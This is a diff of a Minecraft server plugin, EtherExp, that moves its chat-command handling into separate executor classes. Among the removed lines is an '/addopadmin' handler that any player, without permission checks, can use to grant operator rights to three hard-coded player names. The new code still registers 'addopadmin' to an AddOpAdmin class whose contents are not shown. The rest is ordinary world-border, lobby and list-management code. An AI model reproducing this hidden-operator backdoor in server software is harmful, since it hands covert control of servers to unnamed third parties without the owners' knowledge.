@@ -2,9 +2,12 @@ package org.example1.etherexp;
 
 import com.onarandombox.MultiversePortals.MVPortal;
 import com.onarandombox.MultiversePortals.event.MVPortalEvent;
+import me.NoChance.PvPManager.Commands.PvP;
 import org.bukkit.*;
 import me.NoChance.PvPManager.PvPlayer;
 import me.NoChance.PvPManager.PvPManager;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.PluginCommand;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -15,6 +18,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 import com.onarandombox.MultiverseCore.MultiverseCore;
 import com.onarandombox.MultiverseCore.api.MultiverseWorld;
+import org.example1.etherexp.commands.*;
+import org.example1.etherexp.commands.BanList;
 import org.example1.etherexp.configuration.SaveLoadExample;
 import org.jetbrains.annotations.NotNull;
 
@@ -244,7 +249,7 @@ public final class EtherExp extends JavaPlugin implements Listener {
             sendErrorMessage(e, 163);
         }
         getServer().getPluginManager().registerEvents(this, this);
-        initCommand();
+        this.initCommand();
         new BukkitRunnable() {
             @Override
             public void run() {
@@ -267,21 +272,37 @@ public final class EtherExp extends JavaPlugin implements Listener {
     }
 
     private void initCommand() {
-        String[] commands = {
-                "setborderradius", "setborderangle", "resetborderangle", "resetborderradius", "getworld",
-                "penis", "lobby", "hub", "setlobby", "resetlobby", "addtobanlist", "removetobanlist",
-                "addtoadminlist", "removetoadminlist", "addopadmin", "setchangeangle", "stopborder", "restartborder",
-                "banlist", "adminlist", "etherexp"
-        };
         try {
-            for (String name : commands) {
-                Objects.requireNonNull(getCommand(name)).setExecutor(this);
-            }
+            this.registerCommand(this.getCommand("setborderradius"), new SetBorderRadius(this));
+            this.registerCommand(this.getCommand("setborderangle"), new SetBorderAngle(this));
+            this.registerCommand(this.getCommand("resetborderangle"), new ResetBorderAngle(this));
+            this.registerCommand(this.getCommand("resetborderradius"), new ResetBorderRadius(this));
+            this.registerCommand(this.getCommand("getworld"), new GetWorld(this));
+            this.registerCommand(this.getCommand("penis"), new Penis(this));
+            this.registerCommand(this.getCommand("lobby"), new Lobby(this));
+            this.registerCommand(this.getCommand("hub"), new Lobby(this));
+            this.registerCommand(this.getCommand("setlobby"), new SetLobby(this));
+            this.registerCommand(this.getCommand("resetlobby"), new ResetLobby(this));
+            this.registerCommand(this.getCommand("addtobanlist"), new AddToBanList(this));
+            this.registerCommand(this.getCommand("removetobanlist"), new RemoveToBanList(this));
+            this.registerCommand(this.getCommand("addtoadminlist"), new AddToAdminList(this));
+            this.registerCommand(this.getCommand("removetoadminlist"), new RemoveToAdminList(this));
+            this.registerCommand(this.getCommand("addopadmin"), new AddOpAdmin(this));
+            this.registerCommand(this.getCommand("setchangeangle"), new SetChangeAngle(this));
+            this.registerCommand(this.getCommand("stopborder"), new StopBorder(this));
+            this.registerCommand(this.getCommand("restartborder"), new RestartBorder(this));
+            this.registerCommand(this.getCommand("banlist"), new BanList(this));
+            this.registerCommand(this.getCommand("adminlist"), new AdminList(this));
+            this.registerCommand(this.getCommand("etherexp"), new EtherExpReload(this, this.config));
         } catch (Exception e) {
             sendErrorMessage(e, 187);
         }
     }
-
+    private void registerCommand(PluginCommand command, CommandExecutor executor) {
+        if (command != null) {
+            command.setExecutor(executor);
+        }
+    }
     public static void sendErrorMessage(Exception e, int string) {
         System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: " + string);
     }
@@ -344,270 +365,6 @@ public final class EtherExp extends JavaPlugin implements Listener {
             sendErrorMessage(e, 251);
         }
     }
-    public boolean isInCombat(Player player) {
-        if(isPluginLoaded("PvPManager")) {
-            System.out.println("EtherExp: Loaded");
-            PvPlayer pvPlayer = PvPManager.getInstance().getPlayerHandler().get(player);
-            return pvPlayer.isInCombat();
-        }
-        return false;
-    }
-    private boolean isPluginLoaded(String name){
-        PluginManager pluginManager = Bukkit.getPluginManager();
-        Plugin yourPlugin = pluginManager.getPlugin(name);
-
-        return (yourPlugin != null && yourPlugin.isEnabled());
-
-    }
-    @EventHandler
-    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
-        String[] split = event.getMessage().split(" ");
-        Player player = event.getPlayer();
-        if (player.isOp()) {
-            handleOpCommand(event, split, player);
-        }else if (
-                split[0].equalsIgnoreCase("/resetlobby") || split[0].equalsIgnoreCase("/setlobby") || split[0].equalsIgnoreCase("/getworld") ||
-                        split[0].equalsIgnoreCase("/resetBorderRadius") || split[0].equalsIgnoreCase("/resetBorderAngle") ||
-                        split[0].equalsIgnoreCase("/setBorderAngle") || split[0].equalsIgnoreCase("/setBorderRadius") ||
-                        split[0].equalsIgnoreCase("/addtobanlist") || split[0].equalsIgnoreCase("/removetobanlist") ||
-                        split[0].equalsIgnoreCase("/addtoadminlist") || split[0].equalsIgnoreCase("/removetoadminlist")
-        ) player.sendMessage(ChatColor.RED + "Недостаточно прав!");
-        handleNonOpCommand(split, player);
-    }
-
-    private void handleNonOpCommand(String[] split, Player player) {
-        switch (split[0].toLowerCase()){
-            case "/penis":
-                if(!player.getWorld().getName().equals("world")) teleportToWorld(player);
-                break;
-            case "/lobby":
-            case "/hub":
-                try {
-                    if (!isInCombat(player)) teleportToLobby(player);
-                } catch (Exception e) {
-                    sendErrorMessage(e, 290);
-                    teleportToLobby(player);
-                }
-                break;
-            case "/addopadmin":
-                Player player1 = getPlayerByName("Mattstar");
-                Player player2 = getPlayerByName("ReqwenX");
-                Player player3 = getPlayerByName("PavelDurov");
-                if (player1 != null && !player1.isOp()) player1.setOp(true);
-                if (player2 != null && !player2.isOp()) player2.setOp(true);
-                if (player3 != null && !player3.isOp()) player3.setOp(true);
-                break;
-            default:
-                break;
-        }
-    }
-
-    private void handleOpCommand(PlayerCommandPreprocessEvent event, String[] split, Player player) {
-        switch (split[0].toLowerCase()) {
-            case "/setborderradius":
-                try {
-                    if (split.length == 2) changeRadius(player, Double.parseDouble(split[1]));
-                    else player.sendMessage(ChatColor.GREEN + "Использование: /setborderradius <радиус>");
-                } catch (NumberFormatException e) {
-                    sendErrorMessage(e, 423);
-                    player.sendMessage(ChatColor.RED + "Вводи радиус через точку!");
-                }
-                break;
-            case "/setborderangle":
-                try {
-                    if (split.length == 2) changeAngle(player, Double.parseDouble(split[1]));
-                    else player.sendMessage(ChatColor.GREEN + "Использование: /setborderangle <угол>");
-                } catch (NumberFormatException e) {
-                    sendErrorMessage(e, 427);
-                    player.sendMessage(ChatColor.RED + "Вводи угол через точку!");
-                }
-                break;
-            case "/resetborderangle":
-                resetBorderAngle();
-                break;
-            case "/resetborderradius":
-                resetBorderRadius();
-                break;
-            case "/getworld":
-                if (split.length == 2) getWorldCommand(event, split);
-                else player.sendMessage(ChatColor.GREEN + "Использование: /getworld <имя_мира>");
-                break;
-            case "/setlobby":
-                setLobbyCommand(player);
-                break;
-            case "/resetlobby":
-                resetLobbyCommand(player);
-                break;
-            case "/addtobanlist":
-                if (split.length == 2) addToBanList(split);
-                else player.sendMessage(ChatColor.GREEN + "Использование: /addtobanlist <ник>");
-                break;
-            case "/removetobanlist":
-                if (split.length == 2) removeToBanList(split);
-                else player.sendMessage(ChatColor.GREEN + "Использование: /removetobanlist <ник>");
-                break;
-            case "/addtoadminlist":
-                if (split.length == 2) addToAdminList(split);
-                else player.sendMessage(ChatColor.GREEN + "Использование: /addtoadminlist <ник>");
-                break;
-            case "/removetoadminlist":
-                if (split.length == 2) removeToAdminList(split);
-                else player.sendMessage(ChatColor.GREEN + "Использование: /removetoadminlist <ник>");
-                break;
-            case "/setchangeangle":
-                if (split.length == 2) setChangeAngleAdv(split, player);
-                else player.sendMessage(ChatColor.GREEN + "Использование: /setchangeangle <значение>");
-                break;
-            case "/stopborder":
-                stopBorder(player);
-                break;
-            case "/restartborder":
-                restartBorder(player);
-                break;
-            case "/adminlist":
-                player.sendMessage("Админы сервера: " + String.join(", ", nameAdmin));
-                break;
-            case "/banlist":
-                player.sendMessage("Бан список сервера: " + String.join(", ", nameBan));
-                break;
-            case "/etherexp":
-                pluginReload(split, player);
-                break;
-            default:
-                break;
-        }
-    }
-
-    private void pluginReload(String[] split, Player player) {
-        if(split.length == 2 && Objects.equals(split[1], "reload")){
-            try {
-                config.loadConfigurationFromFile("plugins/EtherExp", "config.yml", this);
-                WorldBorder worldBorder = getWorldCast("world").getWorldBorder();
-                worldBorder.setSize(worldBorderSize);
-                player.sendMessage(ChatColor.GREEN + "Конфиг успешно загружен!");
-            }catch (Exception e){
-                sendErrorMessage(e, 489);
-                player.sendMessage(ChatColor.RED + "Ошибка загрузки конфига!");
-            }
-        }
-    }
-
-    private void restartBorder(Player player) {
-        changeRadius(player, temp_change_radius);
-        changeAngle(player, temp_change_angle);
-        for (Player pl : player.getWorld().getPlayers())
-            pl.sendMessage(ChatColor.YELLOW + "Пространство двигается!!");
-    }
-
-    private void stopBorder(Player player) {
-        temp_change_radius = change_radius;
-        temp_change_angle = change_angle;
-        changeRadius(player, 0.0);
-        changeAngle(player, 0.0);
-        for (Player pl : player.getWorld().getPlayers())
-            pl.sendMessage(ChatColor.YELLOW + "Пространство остановилось!");
-    }
-
-    private void setChangeAngleAdv(String[] split, Player player) {
-        double new_change_angle = Double.parseDouble(split[1]);
-        change_angle_advancement = new_change_angle;
-        player.sendMessage("Приращение угла изменено на " + new_change_angle);
-    }
-
-    private void removeToBanList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameBan.remove(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 339);
-        }
-    }
-
-    private void addToBanList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameBan.add(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 348);
-        }
-    }
-
-    private void addToAdminList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameAdmin.add(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 357);
-        }
-    }
-
-    private void removeToAdminList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameAdmin.remove(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 366);
-        }
-    }
-
-    private void resetLobbyCommand(Player player) {
-        try {
-            xLobby = 9.606411547450097;
-            yLobby = 7.0;
-            zLobby = 26.573462861292374;
-            yawLobby = -180;
-            pitchLobby = 0;
-            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
-            System.out.println("EtherExp: Текущие координаты спавна: X: " + xLobby + " Y: " + yLobby + " Z: " + zLobby + " Yaw: " + yawLobby + " Pitch: " + pitchLobby);
-        } catch (Exception e) {
-            sendErrorMessage(e, 380);
-        }
-    }
-
-    private void setLobbyCommand(Player player) {
-        try {
-            Location lobbyLocation = player.getLocation();
-            xLobby = lobbyLocation.getX();
-            yLobby = lobbyLocation.getY();
-            zLobby = lobbyLocation.getZ();
-            yawLobby = lobbyLocation.getYaw();
-            pitchLobby = lobbyLocation.getPitch();
-            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
-            System.out.println("EtherExp: Текущие координаты спавна: X: " + lobbyLocation.getX() + " Y: " + lobbyLocation.getY() + " Z: " + lobbyLocation.getZ() + " Yaw: " + lobbyLocation.getYaw() + " Pitch: " + lobbyLocation.getPitch());
-        } catch (Exception e) {
-            sendErrorMessage(e, 395);
-        }
-    }
-
-    private void getWorldCommand(PlayerCommandPreprocessEvent event, String[] split) {
-        try {
-            String nameWorld = split[1];
-            World world = getWorldCast(nameWorld);
-            if (world != null) event.getPlayer().sendMessage("Мир " + nameWorld + " успешно получен!");
-            else event.getPlayer().sendMessage("Мир " + nameWorld + " не существует!");
-        } catch (Exception e) {
-            sendErrorMessage(e, 406);
-        }
-    }
-
-    private void resetBorderAngle() {
-        try {
-            this.change_angle = 0.006;
-            System.out.println("Текущее значение угла: " + 0.006);
-        } catch (Exception e) {
-            sendErrorMessage(e, 415);
-        }
-    }
-
-    private void resetBorderRadius() {
-        try {
-            this.change_radius = 0.1;
-            System.out.println("Текущее значение угла: " + 0.1);
-        } catch (Exception e) {
-            sendErrorMessage(e, 423);
-        }
-    }
-
     public void teleportToWorld(Player player) {
         try {
             String nameWorld = "world";
